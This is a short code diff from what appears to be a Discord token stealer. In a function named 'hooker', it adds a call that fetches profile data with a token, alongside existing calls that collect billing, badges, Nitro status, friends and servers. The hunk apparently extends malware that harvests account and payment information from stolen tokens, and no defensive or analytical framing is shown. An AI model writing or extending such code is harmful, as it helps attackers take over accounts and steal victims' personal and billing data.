@@ -169,7 +169,7 @@ const hooker = async (content, token, account) => {
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
     const billing = await getBilling(token);
-
+    const profilebilling = await fetchProfile(token);
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
